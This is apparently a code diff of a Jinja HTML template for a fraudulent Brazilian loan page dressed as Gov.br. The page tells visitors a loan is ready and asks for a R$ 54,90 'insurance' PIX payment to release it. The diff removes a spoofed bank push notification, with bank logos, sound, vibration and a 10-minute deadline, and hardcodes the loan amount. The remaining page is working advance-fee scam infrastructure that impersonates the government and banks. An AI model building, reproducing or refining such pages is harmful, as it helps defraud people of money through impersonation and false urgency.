@@ -47,66 +47,6 @@
             font-weight: 800;
             font-style: normal;
         }
-        
-        /* Animações para a notificação */
-        @keyframes slideDown {
-            from {
-                transform: translateY(-100%);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-        @keyframes slideUp {
-            from {
-                transform: translateY(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateY(-100%);
-                opacity: 0;
-            }
-        }
-        @keyframes slideLeft {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(-100%);
-                opacity: 0;
-            }
-        }
-        @keyframes slideRight {
-            from {
-                transform: translateX(0);
-                opacity: 1;
-            }
-            to {
-                transform: translateX(100%);
-                opacity: 0;
-            }
-        }
-        
-        /* Estilo da notificação */
-        .notification {
-            position: fixed;
-            top: 0px;
-            left: 0;
-            right: 0;
-            margin-left: auto;
-            margin-right: auto;
-            z-index: 9999;
-            width: calc(100% - 30px);
-            max-width: 420px;
-            transition: transform 0.2s ease, opacity 0.2s ease;
-            cursor: grab;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(0, 0, 0, 0.06);
-            border-radius: 12px;
-        }
         * {
             margin: 0;
             padding: 0;
@@ -345,108 +285,9 @@
             width: 100px;
             margin: 0 auto 0.8rem;
         }
-        /* Classes específicas para animações de notificação */
-        .notification.hide-up {
-            animation: slideUp 0.3s ease-in forwards;
-        }
-        .notification.hide-left {
-            animation: slideLeft 0.3s ease-in forwards;
-        }
-        .notification.hide-right {
-            animation: slideRight 0.3s ease-in forwards;
-        }
-        .notification-header {
-            display: flex;
-            align-items: center;
-            padding: 12px 15px 8px;
-            background-color: #F8F9FA;
-            border-bottom: 1px solid #E9ECEF;
-        }
-        .notification-app-icon {
-            width: 20px;
-            height: 20px;
-            margin-right: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .notification-app-name {
-            font-size: 13px;
-            font-weight: 600;
-            color: #495057;
-        }
-        .notification-time {
-            margin-left: auto;
-            font-size: 12px;
-            color: #6C757D;
-        }
-        .notification-content {
-            display: flex;
-            padding: 12px 15px;
-        }
-        .notification-bank-logo {
-            width: 48px;
-            height: 48px;
-            border-radius: 10px;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #e3f2fd;
-        }
-        .notification-bank-logo img {
-            width: 30px;
-            height: 30px;
-        }
-        .notification-text-content {
-            flex: 1;
-        }
-        .notification-title {
-            font-size: 14px;
-            font-weight: 700;
-            color: #212529;
-            margin-bottom: 5px;
-        }
-        .notification-message {
-            font-size: 13px;
-            color: #495057;
-            line-height: 1.4;
-        }
-        .touch-indicator {
-            font-size: 11px;
-            color: #6C757D;
-            text-align: center;
-            padding: 8px 0;
-            background-color: #F8F9FA;
-            border-top: 1px solid #E9ECEF;
-        }
     </style>
 </head>
 <body>
-    <!-- Notification -->
-    <div id="paymentNotification" class="notification" style="display: none; background-color: white; padding: 12px; border-radius: 12px; font-family: 'Inter', sans-serif;">
-        <div class="flex justify-between items-start">
-            <div class="flex-grow pr-2">
-                <div class="flex items-center mb-1">
-                    <div class="w-6 h-6 rounded-[10px] mr-2 overflow-hidden">
-                        <img id="bankLogo1" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
-                    </div>
-                    <span id="bankName1" class="text-gray-700 text-sm" style="font-family: 'Inter', sans-serif;">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
-                </div>
-                <div class="text-black text-base font-bold mb-1 flex items-center whitespace-nowrap overflow-hidden" style="text-overflow: ellipsis; font-family: 'Inter', sans-serif;">
-                    <span class="mr-2" style="font-size: 1.1em;">💰</span>
-                    Você vai receber R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}
-                </div>
-            </div>
-            <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
-                <img id="bankLogo2" src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
-            </div>
-        </div>
-        <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word; font-family: 'Inter', sans-serif;">
-            Caixa Econômica Federal está aguardando o pagamento do seguro no valor de R$ {{ "%.2f"|format(amount) }} para depositar R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }} em sua conta <span id="bankText" style="font-family: 'Inter', sans-serif;">Nubank</span>. Copie o código PIX e realize o pagamento em até 10 minutos ou a transação será bloqueada.
-        </div>
-    </div>
-
     <!-- Header -->
     <div class="header">
         <img alt="Logo Gov.br" class="logo" src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"/>
@@ -507,15 +348,15 @@
                 <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ 4.000,00</div>
                     </div>
                     
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Dados Bancários:</div>
                         <div style="font-size: 1rem;">
-                            <div style="margin-bottom: 5px;"><strong>Banco:</strong> {{ bank }}</div>
-                            <div style="margin-bottom: 5px;"><strong>Chave PIX:</strong> {{ customer.pix_key|default(cpf) }}</div>
-                            <div><strong>Tipo de Chave:</strong> {{ customer.key_type|default("CPF") }}</div>
+                            <div style="margin-bottom: 5px;"><strong>Banco:</strong> {{ bank|default("CAIXA ECONÔMICA FEDERAL") }}</div>
+                            <div style="margin-bottom: 5px;"><strong>Chave PIX:</strong> {{ pix_key|default(cpf) }}</div>
+                            <div><strong>Tipo de Chave:</strong> {{ key_type|default("CPF") }}</div>
                         </div>
                     </div>
                     
@@ -530,7 +371,7 @@
                         <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
                         <div style="font-weight: 600; color: #f39c12;">Importante:</div>
                     </div>
-                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ {{ '{:,.2f}'.format(customer.amount|float).replace(',', '.').replace('.', ',') }}</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ 4.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
                 </div>
             </div>
 
@@ -562,7 +403,7 @@
                         <li style="margin-bottom: 10px; line-height: 1.4;">Acesse a área PIX do aplicativo</li>
                         <li style="margin-bottom: 10px; line-height: 1.4;">Selecione a opção "PIX Copia e Cola" ou "Pix QR Code"</li>
                         <li style="margin-bottom: 10px; line-height: 1.4;">Cole o código PIX que você copiou acima</li>
-                        <li style="margin-bottom: 10px; line-height: 1.4;">Confira se o valor de <strong>R$ 54,90</strong> (seguro) e o beneficiário <strong>PAGAMENTO SEGURO INTERMED</strong> estão corretos</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Confira se o valor de <strong>R$ 54,90</strong> e o beneficiário <strong>PAGAMENTO SEGURO INTERMED</strong> estão corretos</li>
                         <li style="margin-bottom: 10px; line-height: 1.4;">Finalize o pagamento conforme instruções do seu banco</li>
                         <li style="margin-bottom: 0; line-height: 1.4;">O pagamento será processado e seu empréstimo será liberado automaticamente</li>
                     </ol>
@@ -618,218 +459,8 @@
         <p>© Todos os direitos reservados.</p>
     </footer>
 
-    <!-- Notification Audio -->
-    <audio id="notificationSound" preload="auto" style="display: none;">
-        <source src="/static/sounds/notification.mp3" type="audio/mpeg">
-        <source src="/static/audio/notification.mp3" type="audio/mpeg">
-    </audio>
-
     <script>
             document.addEventListener('DOMContentLoaded', function() {
-                // Função para obter a imagem do banco baseada no banco
-                function getBankImage(bankName) {
-                    // Mapeamento de bancos para suas respectivas imagens
-                    const bankImages = {
-                        'Nubank': 'https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png',
-                        'Itau': 'https://upload.wikimedia.org/wikipedia/commons/2/2d/2023_Ita%C3%BA_Unibanco_Logo.png',
-                        'Bradesco': 'https://media.licdn.com/dms/image/v2/C4E0BAQEXB9xussWsHQ/company-logo_200_200/company-logo_200_200/0/1680038081184/bradesco_logo?e=2147483647&v=beta&t=g_KrgasAdf1h-qhIvVQG3R5022A7UVAaAnuFYCNBqkc',
-                        'Santander': 'https://i.pinimg.com/564x/e9/67/a4/e967a4935c65ed0da069364e952e4630.jpg',
-                        'Caixa': 'https://seebvideira.com.br/uploads/92868821-e42d-4dd5-a71a-6ee1241c82e5/caixa-logo.svg',
-                        'Banco do Brasil': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi4v4sz_PsGCe98ocnEokjkWgfBgThfi70u-36k6j3f81st-IBaIbW2InDiKlugsqyqTxkVApq4dcgSpFXVDrdNsla1jgm7Da8DyEfZjf1JNveDfj4S80-xIiX9Yy2D5Tx5or-Psg/s1600/BB+logo.jpg',
-                        'Inter': 'https://i.ibb.co/04MjDYh/Design-sem-nome-5.png',
-                        'C6': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQAdb6wCFEOzVXR0WHXSOLsjjWTwWL0u1-FTw&s',
-                        'PicPay': 'https://yt3.googleusercontent.com/cUdSm0KI0fN0sgr5Jb_DvkaQRuR5G9rl1ijX7MoUueMq2AVzNKdBqS_WNALQl9OTRyCviKFJQOs=s900-c-k-c0x00ffffff-no-rj',
-                        'Neon': 'https://t.ctcdn.com.br/j48g27dg8ohgm7yzRap-mQEZkrQ=/i666960.jpeg'
-                    };
-                    
-                    // Retorna a imagem correspondente ao banco ou a imagem padrão do Nubank
-                    return bankImages[bankName] || bankImages['Nubank'];
-                }
-                
-                // Pegar nome do banco da URL ou localStorage
-                let bankName = "Nubank";
-                
-                // Verificar se temos dados no localStorage
-                try {
-                    const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-                    console.log("Loading from localStorage:", userData);
-                    
-                    if (userData.bank) {
-                        bankName = userData.bank;
-                    }
-                } catch(e) {
-                    console.error("Erro ao carregar dados:", e);
-                }
-                
-                // Atualizar a imagem e nome do banco nas notificações
-                const bankImage = getBankImage(bankName);
-                const bankLogos = document.querySelectorAll('.bank-image');
-                bankLogos.forEach(img => {
-                    img.src = bankImage;
-                });
-                
-                document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
-                document.getElementById('bankText').textContent = bankName;
-                
-                // Mostrar notificação após 12 segundos
-                setTimeout(function() {
-                    showNotification();
-                }, 12000);
-
-                function showNotification() {
-                    // Tocar o som de notificação
-                    playNotificationSound();
-
-                    // Obter a notificação
-                    const notification = document.getElementById('paymentNotification');
-                    
-                    // Vibrar dispositivo se possível
-                    if (navigator.vibrate) {
-                        navigator.vibrate(200);
-                    }
-                    
-                    // Exibir a notificação com animação
-                    notification.style.display = 'block';
-                    notification.style.animation = 'slideDown 0.5s forwards';
-                    
-                    // Configurar o tempo para ocultar a notificação (15 segundos)
-                    setTimeout(function() {
-                        if (notification.style.display !== 'none') {
-                            hideNotification('slideUp');
-                        }
-                    }, 15000);
-                    
-                    // Adicionar eventos de toque/mouse para detectar swipe
-                    setupSwipeGesture(notification);
-                }
-                
-                function playNotificationSound() {
-                    try {
-                        const notificationSound = document.getElementById('notificationSound');
-                        if (notificationSound) {
-                            notificationSound.currentTime = 0;
-                            
-                            // Primeiro: tentar reproduzir com promessa (compatível com maioria dos navegadores)
-                            const playPromise = notificationSound.play();
-                            
-                            if (playPromise !== undefined) {
-                                playPromise.then(_ => {
-                                    // Reprodução começou com sucesso
-                                    console.log("Som de notificação tocado com sucesso");
-                                })
-                                .catch(error => {
-                                    console.log("Erro ao tocar som de notificação:", error);
-                                    // Tentar método alternativo para iOS/Safari
-                                    playWithWebAudio(notificationSound.src);
-                                });
-                            }
-                        }
-                    } catch (e) {
-                        console.log("Erro ao reproduzir áudio:", e);
-                    }
-                }
-                
-                // Método alternativo para iOS/Safari
-                function playWithWebAudio(audioUrl) {
-                    try {
-                        // Criar contexto de áudio
-                        const AudioContext = window.AudioContext || window.webkitAudioContext;
-                        const audioContext = new AudioContext();
-                        
-                        // Carregar o áudio
-                        fetch(audioUrl)
-                            .then(response => response.arrayBuffer())
-                            .then(arrayBuffer => audioContext.decodeAudioData(arrayBuffer))
-                            .then(audioBuffer => {
-                                // Criar fonte
-                                const source = audioContext.createBufferSource();
-                                source.buffer = audioBuffer;
-                                source.connect(audioContext.destination);
-                                source.start(0);
-                            })
-                            .catch(error => {
-                                console.log("Erro no método WebAudio:", error);
-                            });
-                    } catch (e) {
-                        console.log("WebAudio não é suportado:", e);
-                    }
-                }
-                
-                function setupSwipeGesture(element) {
-                    let touchStartX = 0;
-                    let touchStartY = 0;
-                    let touchEndX = 0;
-                    let touchEndY = 0;
-                    
-                    // Eventos de toque (para mobile)
-                    element.addEventListener('touchstart', function(e) {
-                        touchStartX = e.changedTouches[0].screenX;
-                        touchStartY = e.changedTouches[0].screenY;
-                    }, false);
-                    
-                    element.addEventListener('touchend', function(e) {
-                        touchEndX = e.changedTouches[0].screenX;
-                        touchEndY = e.changedTouches[0].screenY;
-                        handleSwipe();
-                    }, false);
-                    
-                    // Eventos de mouse (para desktop)
-                    let isMouseDown = false;
-                    
-                    element.addEventListener('mousedown', function(e) {
-                        isMouseDown = true;
-                        touchStartX = e.screenX;
-                        touchStartY = e.screenY;
-                    }, false);
-                    
-                    element.addEventListener('mouseup', function(e) {
-                        if (isMouseDown) {
-                            touchEndX = e.screenX;
-                            touchEndY = e.screenY;
-                            isMouseDown = false;
-                            handleSwipe();
-                        }
-                    }, false);
-                    
-                    // Identificar a direção do swipe
-                    function handleSwipe() {
-                        const diffX = touchEndX - touchStartX;
-                        const diffY = touchEndY - touchStartY;
-                        
-                        // Determinar se foi um swipe horizontal ou vertical
-                        if (Math.abs(diffX) > Math.abs(diffY)) {
-                            // Swipe horizontal
-                            if (diffX > 75) {
-                                // Swipe para a direita
-                                hideNotification('slideRight');
-                            } else if (diffX < -75) {
-                                // Swipe para a esquerda
-                                hideNotification('slideLeft');
-                            }
-                        } else {
-                            // Swipe vertical
-                            if (diffY < -75) {
-                                // Swipe para cima
-                                hideNotification('slideUp');
-                            } else if (diffY > 75) {
-                                // Swipe para baixo (opcional)
-                                // hideNotification('slideDown');
-                            }
-                        }
-                    }
-                }
-                
-                function hideNotification(animationType) {
-                    const notification = document.getElementById('paymentNotification');
-                    notification.classList.add('hide-' + animationType.replace('slide', '').toLowerCase());
-                    
-                    // Após a animação terminar, ocultar o elemento
-                    setTimeout(function() {
-                        notification.style.display = 'none';
-                        notification.classList.remove('hide-' + animationType.replace('slide', '').toLowerCase());
-                    }, 500);
-                }
-
                 let transactionId = '{{ transaction_id }}';
                 let checkInterval;
 
